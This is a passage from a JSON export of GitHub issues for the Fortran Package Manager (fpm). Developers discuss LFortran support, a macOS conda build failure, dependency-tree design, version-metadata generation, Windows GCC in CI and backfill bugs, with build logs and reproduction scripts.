            "text": "I thought LFortran had been added as a compiler option but it does not have the -J option and I tried it and got\n fpm -V build --compiler lfortran\n <INFO> BUILD_NAME: 00000000811C9DC5\n <INFO> COMPILER:  lfortran\n <INFO> C COMPILER:  cc\n <INFO> COMPILER OPTIONS:   -J build/lfortran_00000000811C9DC5/M_time -I build/lfortran_00000000811C9DC5/M_time\n <INFO> INCLUDE DIRECTORIES:  []\n + lfortran -c ./src/M_time_duplicate.f90  -J build/lfortran_00000000811C9DC5/M_time -I build/lfortran_00000000811C9DC5/M_time  -o build/lfortran_00000000811C9DC5/M_time/src_M_time_duplicate.f90.o\nThe following argument was not expected: -J\nRun with --help for more information.\n<ERROR> Compilation failed for object \" src_M_time_duplicate.f90.o \"\n<ERROR>stopping due to failed compilation\nSTOP 1",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-08-26 06:25:58+00:00",
                    "text": "LFortran 0.13.0 will be supported, the current version on conda-forge doesn't work yet. I used lfortran@fdcec47 for the testing."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-08-26 12:46:52+00:00",
                    "text": "OK.  I was using 0.12.0"
                }
            ]
        },
        {
            "number": 544,
            "user": "certik",
            "date": "2021-08-22 22:52:02+00:00",
            "title": "Fill in LFortran options into the compilers table",
            "text": "I put in options that I'll implement in LFortran or that are already implemented.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2021-08-22 22:52:17+00:00",
                    "text": "@awvwgk would you have time to then update fpm to use lfortran correctly using these options? I looked how fpm uses gfortran to compile an example project and created an analogous script using lfortran, attached below. It seems to just work.\n#!/bin/bash\n\nset -ex\n\n#FC=gfortran\nFC=lfortran\n\nmkdir -p build/dependencies\nmkdir -p build/gfortran_2A42023B310FA28D/default_new_project\n$FC -c test/check.f90 -J build/gfortran_2A42023B310FA28D/default_new_project -I build/gfortran_2A42023B310FA28D/default_new_project  -o build/gfortran_2A42023B310FA28D/default_new_project/test_check.f90.o\n$FC -c ././src/default_new_project.f90 -J build/gfortran_2A42023B310FA28D/default_new_project -I build/gfortran_2A42023B310FA28D/default_new_project  -o build/gfortran_2A42023B310FA28D/default_new_project/src_default_new_project.f90.o\nar -rs build/gfortran_2A42023B310FA28D/default_new_project/libdefault_new_project.a build/gfortran_2A42023B310FA28D/default_new_project/src_default_new_project.f90.o\n$FC -c app/main.f90 -J build/gfortran_2A42023B310FA28D/default_new_project -I build/gfortran_2A42023B310FA28D/default_new_project  -o build/gfortran_2A42023B310FA28D/default_new_project/app_main.f90.o\nmkdir -p build/gfortran_2A42023B310FA28D/app/\n$FC -J build/gfortran_2A42023B310FA28D/default_new_project -I build/gfortran_2A42023B310FA28D/default_new_project  build/gfortran_2A42023B310FA28D/default_new_project/app_main.f90.o build/gfortran_2A42023B310FA28D/default_new_project/libdefault_new_project.a -o build/gfortran_2A42023B310FA28D/app/default_new_project\nmkdir -p build/gfortran_2A42023B310FA28D/test/\n$FC -J build/gfortran_2A42023B310FA28D/default_new_project -I build/gfortran_2A42023B310FA28D/default_new_project  build/gfortran_2A42023B310FA28D/default_new_project/test_check.f90.o build/gfortran_2A42023B310FA28D/default_new_project/libdefault_new_project.a -o build/gfortran_2A42023B310FA28D/test/check\nHere is the output for me:\n$ ./a.sh \n+ FC=lfortran\n+ mkdir -p build/dependencies\n+ mkdir -p build/gfortran_2A42023B310FA28D/default_new_project\n+ lfortran -c test/check.f90 -J build/gfortran_2A42023B310FA28D/default_new_project -I build/gfortran_2A42023B310FA28D/default_new_project -o build/gfortran_2A42023B310FA28D/default_new_project/test_check.f90.o\n+ lfortran -c ././src/default_new_project.f90 -J build/gfortran_2A42023B310FA28D/default_new_project -I build/gfortran_2A42023B310FA28D/default_new_project -o build/gfortran_2A42023B310FA28D/default_new_project/src_default_new_project.f90.o\n+ ar -rs build/gfortran_2A42023B310FA28D/default_new_project/libdefault_new_project.a build/gfortran_2A42023B310FA28D/default_new_project/src_default_new_project.f90.o\nar: creating archive build/gfortran_2A42023B310FA28D/default_new_project/libdefault_new_project.a\n/Library/Developer/CommandLineTools/usr/bin/ranlib: file: build/gfortran_2A42023B310FA28D/default_new_project/libdefault_new_project.a(src_default_new_project.f90.o) has no symbols\nwarning: /Library/Developer/CommandLineTools/usr/bin/ranlib: archive library: build/gfortran_2A42023B310FA28D/default_new_project/libdefault_new_project.a the table of contents is empty (no object file members in the library define global symbols)\n+ lfortran -c app/main.f90 -J build/gfortran_2A42023B310FA28D/default_new_project -I build/gfortran_2A42023B310FA28D/default_new_project -o build/gfortran_2A42023B310FA28D/default_new_project/app_main.f90.o\n+ mkdir -p build/gfortran_2A42023B310FA28D/app/\n+ lfortran -J build/gfortran_2A42023B310FA28D/default_new_project -I build/gfortran_2A42023B310FA28D/default_new_project build/gfortran_2A42023B310FA28D/default_new_project/app_main.f90.o build/gfortran_2A42023B310FA28D/default_new_project/libdefault_new_project.a -o build/gfortran_2A42023B310FA28D/app/default_new_project\n+ mkdir -p build/gfortran_2A42023B310FA28D/test/\n+ lfortran -J build/gfortran_2A42023B310FA28D/default_new_project -I build/gfortran_2A42023B310FA28D/default_new_project build/gfortran_2A42023B310FA28D/default_new_project/test_check.f90.o build/gfortran_2A42023B310FA28D/default_new_project/libdefault_new_project.a -o build/gfortran_2A42023B310FA28D/test/check\nThe two executables work\n$ build/gfortran_2A42023B310FA28D/app/default_new_project \nHello, default_new_project!\n$ build/gfortran_2A42023B310FA28D/test/check             \nPut some tests in here!\nThe warning about the object files comes from the fact that LFortran currently creates empty object files and stores the code in mod files and only when the final executable is compiled it actually compiles everything. We'll eventually add a mode to compile file by file also. From fpm's perspective this is minor. Also the -J and -I options currently are a no-op in LFortran, so it puts the .mod file in the current directory (and also finds them there), see lfortran!1265. That will also get fixed."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-23 06:45:00+00:00",
                    "text": "Done in #527, just checked with 0.12.0 but this doesn't work yet. Guess I have to compile from source, i.e. downgrade my LLVM installation first."
                },
                {
                    "user": "certik",
                    "date": "2021-08-23 13:57:05+00:00",
                    "text": "Thanks! I can test fpm or your PR myself to see if it works. I didn't see any change of options for lfortran in #537. The main one is the -module option that LFortran does not support."
                },
                {
                    "user": "certik",
                    "date": "2021-08-23 14:00:03+00:00",
                    "text": "I see the change in 937b87e, but it doesn't seem to be part of any PR.\nBtw, what compatibility does there have to be between a C compiler and a Fortran compiler? LFortran seems to work with any C compiler. I know on Windows one has to generate object files that are compatible with the MSVC linker, which I think GFortran does not. Apart from that, is there any other issue?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-23 14:14:11+00:00",
                    "text": "The commit is part of #527.\nActually, I don't think we need any compatibility between C and Fortran, except for the guarantee of a compatible C ABI between the C and the Fortran compiler in case of iso_c_binding usage. Therefore, for all Fortran compilers any C compiler should do. Linking is a different story, we rely on the Fortran compiler to correctly wrap the platform linker."
                },
                {
                    "user": "certik",
                    "date": "2021-08-23 16:43:01+00:00",
                    "text": "I struggled with C ABI for complex numbers, but got it working on Linux and macOS: https://gitlab.com/lfortran/lfortran/-/issues/528. I still didn't get it working on Windows. Linking the MSVC compiled C and LFortran compiled Fortran works for everything except the complex types passed by value. I am aware of https://en.wikipedia.org/wiki/X86_calling_conventions#Microsoft_x64_calling_convention and LLVM code generation automatically implements it, but it does not specify how C structs {float,float} and {double,double} are passed by value --- I had to work to get it working on Linux/macOS, and I still need to know what LLVM code to emit to make it work on Windows. If anybody knows that, please let me know.\nSecond question: I suspect the C ABI is different between MSVC and GCC on Windows?"
                },
                {
                    "user": "certik",
                    "date": "2021-08-25 02:33:43+00:00",
                    "text": "and I still need to know what LLVM code to emit to make it work on Windows. If anybody knows that, please let me know.\n\nI figured it out and as of now, LFortran master works well with complex numbers on Windows to and from C. I documented the details in: https://gitlab.com/lfortran/lfortran/-/wikis/Platform-Calling-Conventions-and-ABI\n\nSecond question: I suspect the C ABI is different between MSVC and GCC on Windows?\n\nIt seems the calling convention might be different. And the object file format is also different. So users would simply choose on a command line which target to generate for: https://gitlab.com/lfortran/lfortran/-/issues/545"
                },
                {
                    "user": "certik",
                    "date": "2021-08-25 02:42:00+00:00",
                    "text": "This PR now continues as part of #527."
                }
            ]
        },
        {
            "number": 543,
            "user": "certik",
            "date": "2021-08-22 22:26:08+00:00",
            "title": "fpm fails to build on macOS with Conda",
            "text": "I use the usual conda create -n fpm fpm gfortran clang and then go to the fpm git repository and:\n$ fpm build\n + mkdir -p build/dependencies\nInitialized empty Git repository in /Users/certik/repos/fortran-lang/fpm/build/dependencies/toml-f/.git/\nremote: Enumerating objects: 115, done.\nremote: Counting objects: 100% (115/115), done.\nremote: Compressing objects: 100% (104/104), done.\nremote: Total 115 (delta 27), reused 47 (delta 8), pack-reused 0\nReceiving objects: 100% (115/115), 105.17 KiB | 158.00 KiB/s, done.\nResolving deltas: 100% (27/27), done.\nFrom https://github.com/toml-f/toml-f\n * branch            2f5eaba864ff630ba0c3791126a3f811b6e437f3 -> FETCH_HEAD\nInitialized empty Git repository in /Users/certik/repos/fortran-lang/fpm/build/dependencies/M_CLI2/.git/\nremote: Enumerating objects: 191, done.\nremote: Counting objects: 100% (191/191), done.\nremote: Compressing objects: 100% (110/110), done.\nremote: Total 191 (delta 93), reused 156 (delta 80), pack-reused 0\nReceiving objects: 100% (191/191), 1.08 MiB | 166.00 KiB/s, done.\nResolving deltas: 100% (93/93), done.\nFrom https://github.com/urbanjost/M_CLI2\n * branch            ea6bbffc1c2fb0885e994d37ccf0029c99b19f24 -> FETCH_HEAD\n + mkdir -p build/gfortran_2A42023B310FA28D/fpm\n + gfortran -c ././src/filesystem_utilities.c -o build/gfortran_2A42023B310FA28D/fpm/src_filesystem_utilities.c.o\ngfortran: fatal error: cannot execute \u2018cc1\u2019: execvp: No such file or directory\ncompilation terminated.\n <ERROR> Compilation failed for object \"src_filesystem_utilities.c.o\"\nSTOP 1\nThe failure comes from the fact that gfortran is being used to compile a C file. If you use the default cc compiler, it would compile just fine:\n$ cc -c ./src/filesystem_utilities.c -o build/gfortran_2A42023B310FA28D/fpm/src_filesystem_utilities.c.o\nSince I now can't compile fpm in the first place, it's not easy to fix for me.",
            "comments": [
                {
                    "user": "brocolis",
                    "date": "2021-08-23 02:29:08+00:00",
                    "text": "This works in Windows: set FPM_C_COMPILER=gcc - an equivalent command in macOS may help."
                },
                {
                    "user": "certik",
                    "date": "2021-08-23 03:08:37+00:00",
                    "text": "That works! I did:\nFPM_C_COMPILER=clang fpm build\n\nAnd this now builds fpm on my macOS. Thank you @brocolis."
                },
                {
                    "user": "certik",
                    "date": "2021-08-23 03:09:46+00:00",
                    "text": "I am going to keep this issue open until either:\n\nThis just works out of the box\nOr there is a clear error message with this hint to use FPM_C_COMPILER=clang.\n\nI think fpm should now that gfortran can't compile C files on macOS (for whatever reason)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-23 06:50:48+00:00",
                    "text": "Can you provide the output of conda list? This is incredible helpful for troubleshooting conda related issues.\nI think you might be hitting conda-forge/gfortran_osx-64-feedstock#11, which has been lingered in the GCC toolchain for OSX for quite a while now and has only been fixed recently."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-26 08:12:58+00:00",
                    "text": "This should be solved with #527 now."
                }
            ]
        },
        {
            "number": 541,
            "user": "awvwgk",
            "date": "2021-08-12 16:21:04+00:00",
            "title": "Allow serialization of the fpm model to TOML",
            "text": "Currently the serialized model doesn't follow a standardized format, which makes it difficult to inspect with external tools.\nSimilar to #540, the model should be able to write itself to TOML. This provides a representation which can be easily accessed from different programming languages to work with the fpm internal data structures.\nThe TOML representation of the model would become part of the specification of fpm at some point, but for the initial implementation we wouldn't guarantee the stability of the output. Once we arrive at a stable representation, we can extend to reading the model again. This allows round tripping it from fpm to plugins as a future enhancement once we can serialize it.",
            "comments": []
        },
        {
            "number": 540,
            "user": "awvwgk",
            "date": "2021-08-12 16:08:17+00:00",
            "title": "Refactor: Allow manifest data types to serialize and deserialize themselves",
            "text": "Like the dependency tree all package manifest types should be able to deserialize and serialize themselves.\nThis is likely to conflict with any changes at the manifest data types and therefore deferred until we decided how to proceed with #498.\nCurrently, our target data structure would be the representation provided by TOML-Fortran, but in the future we might use a more general data type provided by stdlib (see fortran-lang/stdlib#479).",
            "comments": []
        },
        {
            "number": 539,
            "user": "kubajj",
            "date": "2021-08-10 11:10:59+00:00",
            "title": "Add parent packages into dependency tree",
            "text": "This PR adds an array of indices of parent nodes to each node of the dependency tree. It is part of my Handling compiler arguments GSoC 2021 project and was separated from #498 for easier review.",
            "comments": [
                {
                    "user": "kubajj",
                    "date": "2021-08-10 12:29:10+00:00",
                    "text": "I'm not sure whether the parent list should actually be optional in the cache.\n\nI think that as main package does not have any parents, wouldn't this cause an issue?\n\nWithout requiring the parent list an existing cache could be loaded and might not contain this information. Instead we should require the data and invalidate the cache if the parent list is not present.\n\nShould I call it with requested=.true. or just check the stat and raise an error if it is not toml_stat%success?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-10 14:16:36+00:00",
                    "text": "I think that as main package does not have any parents, wouldn't this cause an issue?\n\nThe list would be empty in this case. For a cyclic dependency the main project might as well have a parent.\n\nShould I call it with requested=.true. or just check the stat and raise an error if it is not toml_stat%success?\n\nThis is more difficult, in principle we could just request it but this potentially result in no connections in case of an old cache. Therefore, best is to not request it and create an error if it is not associated. This should automatically invalidate the cache and fpm will recreate it by building the dependency tree again."
                },
                {
                    "user": "kubajj",
                    "date": "2021-08-11 10:06:46+00:00",
                    "text": "Should I call it with requested=.true. or just check the stat and raise an error if it is not toml_stat%success?\n\nThis is more difficult, in principle we could just request it but this potentially result in no connections in case of an old cache. Therefore, best is to not request it and create an error if it is not associated. This should automatically invalidate the cache and fpm will recreate it by building the dependency tree again.\n\nShould this really be an error? I thought that we should just dump the cache and build the dependency tree on our own if the parent table is missing."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-11 10:44:35+00:00",
                    "text": "Generating an error while reading the cache is okay. An error signals an invalid cache file and the caller is responsible for handling the error by invalidating the cache file (i.e. deleting it)."
                },
                {
                    "user": "kubajj",
                    "date": "2021-08-11 11:34:41+00:00",
                    "text": "Generating an error while reading the cache is okay. An error signals an invalid cache file and the caller is responsible for handling the error by invalidating the cache file (i.e. deleting it).\n\nSo I should modify the add_project subroutine to delete cache if self%load fails?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-11 11:59:02+00:00",
                    "text": "This should already be the default behaviour:\n\n  \n    \n      fpm/src/fpm/dependency.f90\n    \n    \n        Lines 237 to 240\n      in\n      d72d953\n    \n    \n    \n    \n\n        \n          \n           if (allocated(self%cache)) then \n        \n\n        \n          \n             call self%load(self%cache, error) \n        \n\n        \n          \n             if (allocated(error)) return \n        \n\n        \n          \n           end if \n        \n    \n  \n\n\nRight this is not done yet. add_project would be the right place to fix this."
                },
                {
                    "user": "kubajj",
                    "date": "2021-08-11 12:09:52+00:00",
                    "text": "This should already be the default behaviour:\n\n  \n    \n      fpm/src/fpm/dependency.f90\n    \n    \n        Lines 237 to 240\n      in\n      d72d953\n    \n    \n    \n    \n\n        \n          \n           if (allocated(self%cache)) then \n        \n\n        \n          \n             call self%load(self%cache, error) \n        \n\n        \n          \n             if (allocated(error)) return \n        \n\n        \n          \n           end if \n        \n    \n  \n\n\nRight this is not done yet. add_project would be the right place to fix this.\n\nCan I create an empty toml array? I am struggling to pass ci tests for example packages with just the main package."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-11 15:01:13+00:00",
                    "text": "After looking into this for a while I wonder why have to save the parents of each dependency. Saving the dependees of each dependency is unpractical as adding a dependency requires to potentially modify all nodes. Instead saving the dependencies of each dependency, i.e. the child nodes, keeps the information about a dependency local in each node.\nIn the context of applying profiles we should be able to walk the tree from the main project while applying either the parent profile or overwriting it with a profile from the current project.\ncc @LKedward @everythingfunctional"
                },
                {
                    "user": "LKedward",
                    "date": "2021-08-11 15:24:52+00:00",
                    "text": "Apologies for the late notice Sebastian @awvwgk, but are you available tomorrow at 3PM UTC to join our mentor chat? It might be quicker to discuss this altogether."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-11 15:27:55+00:00",
                    "text": "Sure, should be able to join, I'll make a note for tomorrow 3PM UTC/5PM CEST."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-12 16:14:38+00:00",
                    "text": "As discussed I will take over the implementation of the retaining the topology of the dependency tree and implementing a mechanism to transverse the tree later when building up the model (see #355 for more details)."
                }
            ]
        },
        {
            "number": 538,
            "user": "Carltoffel",
            "date": "2021-08-10 08:13:32+00:00",
            "title": "Fetch Version Number From fpm.toml",
            "text": "Is there a way to fetch the version number defined in the fpm.toml in the compile process of fpm to remove the redundancy to the version number defined in this line?",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-08-10 08:20:35+00:00",
                    "text": "Currently not. There are several options here:\n\nfpm could export the version number as a preprocessor macro (different formats are possible, like PROJECT_VERSION as string or PROJECT_VERSION_{MAJOR,MINOR,PATCH} with the individual integers.\nfpm could automatically generate a module <name>_version which contains the version number as parameter (for compile time evaluation) and a getter function as well (for runtime evaluation, dynamic linking). We possibly have to support a user-defined template for this purpose.\nfpm can read the version number from a file, this could be used to somehow transfer the version number to Fortran source code."
                },
                {
                    "user": "Carltoffel",
                    "date": "2021-08-10 08:34:12+00:00",
                    "text": "I like the idea of option 2. But maybe this could be more general. E.g. project_metadata_m.f90 containing not only the version number but also the projects name, license, author etc.\nProblem with option 1 is that there is still no standard preprocessor for Fortran (as far as I know).\nProblem with option 3 is that the executable can be copied anywhere where it cannot find this file anymore. IMO the version number should be compiled into the executable program."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-10 08:52:23+00:00",
                    "text": "Potential syntax for the manifest might be:\n[[generate]]  # table name open for discussion\noutput = \"src/version.f90\"\ninput = \"config/version.f90.in\"\nscheme = \"configure_file\"  # allows to support different formats later\nTo generate files for option 2 the configure file syntax supported by several build systems could be used, a template could look like this:\nmodule @PROJECT_NAME@_version\n  implicit none\n  private\n\n  public :: @PROJECT_NAME@_version_string, @PROJECT_NAME@_version_compact\n  public :: get_@PROJECT_NAME@_version\n\n  !> String representation of the @PROJECT_NAME@ version\n  character(len=*), parameter :: @PROJECT_NAME@_version_string = @PROJECT_VERSION@\n\n  !> Numeric representation of the @PROJECT_NAME@ version\n  integer, parameter :: @PROJECT_NAME@_version_compact(3) = [@PROJECT_VERSION_MAJOR@, @PROJECT_VERSION_MINOR@, @PROJECT_VERSION_PATCH@]\n\ncontains\n\n!> Getter function to retrieve @PROJECT_NAME@ version\nsubroutine get_@PROJECT_NAME@_version(major, minor, patch, string)\n  !> Major version number of the @PROJECT_NAME@ version\n  integer, intent(out), optional :: major\n  !> Minor version number of the @PROJECT_NAME@ version\n  integer, intent(out), optional :: minor\n  !> Patch version number of the @PROJECT_NAME@ version\n  integer, intent(out), optional :: patch\n  !> String representation of the @PROJECT_NAME@ version\n  character(len=:), allocatable, intent(out), optional :: string\n\n  if (present(major)) then\n    major = @PROJECT_NAME@_version_compact(1)\n  end if\n  if (present(minor)) then\n    minor = @PROJECT_NAME@_version_compact(2)\n  end if\n  if (present(patch)) then\n    patch = @PROJECT_NAME@_version_compact(3)\n  end if\n  if (present(string)) then\n    string = @PROJECT_NAME@_version_string\n  end if\n\nend subroutine get_@PROJECT_NAME@_version\n\nend module @PROJECT_NAME@_version\nThis would allow to use the same strategy for including meta data with fpm, meson, cmake, etc., which is something I personally find very important, because it would be quite tedious to adapt an fpm-specialized format to other build systems."
                },
                {
                    "user": "Carltoffel",
                    "date": "2021-08-10 10:28:07+00:00",
                    "text": "This sounds very complicated, but if this is necessary to keep this compatible to meson etc. so be it.\nMy approach (without any knowledge of meson etc.) would look like this:\nfpm build would put the information parsed from fpm.toml into a module, which would not be copied into src but it would be saved/compiled directly into the build directory, next to the other compiled modules.\nmodule project_metadata_m\ncharacter(len=*), parameter :: name       = \"example\"\ninteger,          parameter :: version(*) = [0, 1, 2]\n! author, licence, etc.\nend module project_metadata_m\n\nThis module could then be useed by the routine which prints the version information.\nI don't know how important compatibility to other build systems is and it's definitely another discussion. But as we see with this example, compatibility comes with a very high cost. IMHO things are getting too complicated, both for the users and for the implementation of fpm, if we would try to be too open for everything else."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-08-10 12:53:01+00:00",
                    "text": "I think the approaches outlined in the last two comments can be merged. Edit: in fact, this is precisely option 2, just including all the useful information, and not only the version number.\nThe approach suggested by @Carltoffel can be realized by shipping fpm together with a standard template for the metadata/version, according to the syntax proposed by @awvwgk. Users could override this default template by providing their own \".in\" file within the src directory.\nThe template file would need to be either compiled into fpm or located in a folder where fpm can find it (potentially trouble)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-10 13:52:24+00:00",
                    "text": "Generating source files should require a similar infrastructure like a custom preprocessor, i.e. generated files have to be updated in case their source changes, get scanned for modules and added to the build targets."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-08-10 17:36:22+00:00",
                    "text": "I wonder if their is clash between the meson/CMake configuration preprocessor syntax and fypp, due to the use of the '@' symbol?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-10 18:01:13+00:00",
                    "text": "Preprocessing a generated file sounds risky, better get it right on the first try. But I have seen multiple passes with fypp and cpp in the past (forpy) and are guilty of building some myself in meson (cpp, ffi-builder, cc, cc).\nI was bringing up preprocessing since the generation of files would require the same infrastructure as supporting an external preprocessor in fpm. Of course this could lead to cases we have to pass a file through multiple possible incompatible generator steps. Not sure whether fypp is actually compatible with configure_file templates, but I guess the @: macro declaration is distinct enough to not match an identifier that can be expanded by a configuration."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-08-11 02:17:08+00:00",
                    "text": "#252 discusses similiar issues, and there was another I thought was in the Discussion session I cannot find discussing a module versus INCLUDE file, whether it should generate the file in the build/ directory or in /src or whether a new directory at the top level or within src/, such as src/meta and whether it should be a fixed name or something configurable ( I personally like the idea of a default for everything to keep it simple. I started a plug-in that is basically independent of fpm and it just reads the fpm.toml file and queries the date and time and such and builds a module (after experimenting with pre-processing, include files, and a module I like this the best but there are uses for each and they are not necessarily mutually exclusive). The biggest trouble with the plug-in is that it is not automatically triggered by a build, but you have to run \"fpm meta\" or \"fpm-meta\", which could easily be resolved by a check for and execution of it by the build but is a real drawback if you forget to run it, but it is primarily for testing the other ideas for it, is simple and can progress independent of the core utilities.  Again resolvable but it does not pick up the compiler version for the same resaon (not incorporated into the build automatically) but it is still useful. You get the TOML info, the date and time it was run (which if integrated would be the last build time, most useful for applications.  I did not finish an option that used a --list output to get all the filenames and build a \"manifest\" dictionary with the last change data of all the files used in the build; it was an interesting idea but I was not using it but a configuration zealot might find it appealing.  Using a preprocessor has advantages, especially if the macros are passed to the build but I use my own preprocessor and it would be a huge issue to switch to another and I suspect others have some issue with anything other than perhaps using fypp, and many want their code to be preprocessor free so a preprocessor might be complementary but not a single-method solution in my opinion. some of it runs into issues with incremental builds, the module solves that the best; if doing any kind of pre-processing being able to have an OS TYPE and COMPILER TYPE in particular are valuable. Even now, passing -DOS_TYPE and -DCOMPILER would be really handy as most compilers support the -D switch for use with fpp or cpp in a standard way for simple stuff (although each one seems to be a little different in the dusty corners at a minimum). I like something just writing a module; as fpm grows in power I have quit using CMake and except that to become common unless we make fpm just as complicated to use :>\nSo I think a good first cut is a routine that writes a module that is just a Fortran version of the metadata in the TOML file is the best first cut. It is easy to do a lot of it completely outside of fpm, but since fpm already calls the TOML library and knows when to trigger a rewrite it seems some time of integration is required, not just a plug-in but for more rapid development this could still take the form of a plug-in that is just called during a build. That would let people customize in such features as local configuration information and so on in a reasonable fashion without requiring templates and pre-processors; just a custom plug-in. One thing I was playing with in mine was a custom call to making an sqlite3 log of the builds and the results of the last QA run, as an example."
                },
                {
                    "user": "Carltoffel",
                    "date": "2021-08-11 07:09:22+00:00",
                    "text": "Another thing that came into my mind is git:\nYou can tag commits with version numbers which will create another redundancy. I cannot imagine any solution to this \"problem\" but maybe someone else knows something?\nAt least it could be very handy if one could request a dependency via version number and not only the revision hash. But for this to work the tags have to be correct. Otherwise fpm would have to search for a commit where the fpm.toml contains the specified version."
                }
            ]
        },
        {
            "number": 537,
            "user": "zoziha",
            "date": "2021-08-09 03:11:59+00:00",
            "title": "Unexpected windows-gfortran version (8.1) in fpm/GitHub-CI(workflow:CI.yml)",
            "text": "I don't know if this is a problem.\nAs far as I know, fortran-lang/stdlib has removed support for gcc version (<=8).\nfpm/CI.yml expected the gcc version under windows to be 9, but actually got 8.1.\nYou can see my branch : check_gfortran_windows and screenshots:\n\nI don't know how to solve this problem, so I file an issue here.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-08-09 06:24:46+00:00",
                    "text": "Yes, this is an issue, we are using GCC/MinGW packaged by choco, which has a track record of packaging only very few GCC versions and updating only sporadically (measured in multiple of years). The alternative is using MSYS2, which always comes with a fairly recent version of GCC, but there are other issues (like fortran-lang/setup-fpm#4, potential solution #401). Another option is to download a standalone GCC/MinGW package from elsewhere (https://equation.com or https://winlibs.com).\nI haven't yet spend much time to investigate Windows building beyond exploring MSYS2 and packaging fpm for the MinGW toolchain myself."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-09 20:21:22+00:00",
                    "text": "Here is how far I got with the GCC versions from https://github.com/brechtsanders/winlibs_mingw/releases. The workflow below will create a matrix for GCC 11, 10 and 9 and check whether the compilers have been added to the PATH. I didn't get it working with stdlib because cmake and ninja just didn't want to work together correctly for some reason, but might still be useful for fpm:\njobs:\n  gcc-build:\n    runs-on: windows-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        include:\n          - gcc_v: 11\n            tag: 11.2.0-12.0.1-9.0.0-r1\n            zip: winlibs-x86_64-posix-seh-gcc-11.2.0-mingw-w64-9.0.0-r1.zip\n          - gcc_v: 10\n            tag: 10.3.0-12.0.0-9.0.0-r2\n            zip: winlibs-x86_64-posix-seh-gcc-10.3.0-mingw-w64-9.0.0-r2.zip\n          - gcc_v: 9\n            tag: 9.4.0-9.0.0-r1\n            zip: winlibs-x86_64-posix-seh-gcc-9.4.0-mingw-w64-9.0.0-r1.zip\n    defaults:\n      run:\n        shell: bash\n    steps:\n    - uses: actions/checkout@v2\n\n    - name: Download GCC/MinGW\n      uses: i3h/download-release-asset@v1\n      with:\n        owner: brechtsanders\n        repo: winlibs_mingw\n        tag: ${{ matrix.tag }}\n        file: ${{ matrix.zip }}\n\n    - name: Setup GCC/MinGW\n      run: |\n        unzip ${{ matrix.zip }}\n        echo \"$PWD/mingw64/bin\" >> $GITHUB_PATH\n\n    - name: Check programs\n      run: |\n        echo $PATH\n        gcc --version\n        gfortran --version"
                },
                {
                    "user": "brocolis",
                    "date": "2021-08-09 23:56:44+00:00",
                    "text": "Thanks @awvwgk. Since winlibs contains mingw32-make, we can build stdlib with it. I've tested this script locally, with winlibs in PATH:\nset MAKE=mingw32-make\n%MAKE% -f Makefile.manual FYPPFLAGS=-DMAXRANK=4\nand it works."
                }
            ]
        },
        {
            "number": 536,
            "user": "urbanjost",
            "date": "2021-08-08 15:29:56+00:00",
            "title": "still call \"git init\" even if fpm.toml exists in backfill",
            "text": "closes #535 by exiting the routine to create a default fpm.toml manifest if fpm.toml exists\nA backfill should not fail with an error, but should just create a more complete fpm package, possibly producing  messages along the way depending on what actions are taken.\nIf a backfill that would have created a plain basic fpm.toml file is invoked and the fpm.toml file already exists, the command stops\nand therefore does not complete the remaining steps  (which is basically currently just a \"git init\"), so if the package does not already have git initialized it remains so, which is unintended. This change produces an  message instead of a failure, allowing the new subcommand to continue and to complete the remaining intended actions when the above scenario occurs.",
            "comments": []
        },
        {
            "number": 535,
            "user": "urbanjost",
            "date": "2021-08-08 15:19:17+00:00",
            "title": "git init not called when backfilling a package if fpm.toml file exists",
            "text": "If a default fpm.toml file is going to be built and the fpm.toml file already exists, the new subcommand stops with an  instead of continuing with an , preventing the last action (calling \"git init\") from being called. This means git(1) is not initialized if the directory does not already have it set up; therefore skipping the last intended step.  That is, if you simulate this by\nfpm new  A\ncd A\nrm -rfv .git app\n# simulated a hand-built fpm package without a src/ directory or git(1) that you want to backfill\nfpm new --backfill\nls .git   # it is not there, and the backfill has an error message and a \"STOP 3\".",
            "comments": []
        },
        {
            "number": 534,
            "user": "urbanjost",
            "date": "2021-08-07 21:56:25+00:00",
            "title": "A few glitches",
            "text": "There is some very non-intuitive behavior at best in the way the following performs\nIf app/ has a program in it not named main.f90 it will built if the src/ directory exists even if it is empty; but will not build if the empty src/ directory is removed.   If there is a an app/main.f90 file all programs in app/ will build even with a minimalist manifest file (fpm.toml) but no programs will build if app/main.f90 is removed when there is no src/ directory.  The following script can generate some of the glitches or non-intuitive behavior; with the output appended to the script.\n #!/bin/bash\n  (\n  exec 2>&1\n  date\n  set -x\n  : 'everthing as expected'\n  : 'build and install glitches(1) from app/main.f90'\n  fpm new glitches\n  cd glitches\n  fpm build\n  fpm install\n  : 'make two programs'\n  cp app/main.f90 app/glitches2.f90\n  : 'builds and installs both'\n  fpm install\n  fpm run --list\n\n  : 'now the glitches start'\n  : \n  : 'even though app/glitches2.f90 remains it is'\n  : 'no longer installed if app/main.f90 is removed'\n  rm app/main.f90\n  fpm build\n  fpm install\n  fpm run --list\n  fpm install --list\n  : 'if there is no src/ directory it will not'\n  : 'be built but it will be even if src/ is'\n  : 'empty'\n  rm -rfv test src\n  rm -rfv build\n  fpm run --list\n  fpm install --list\n  )|tee -a $0\n  exit\nSat 07 Aug 2021 05:45:50 PM EDT\n+ : 'everthing as expected'\n+ : 'build and install glitches(1) from app/main.f90'\n+ fpm new glitches\n + mkdir -p glitches\n + cd glitches\n + mkdir -p glitches/src\n + 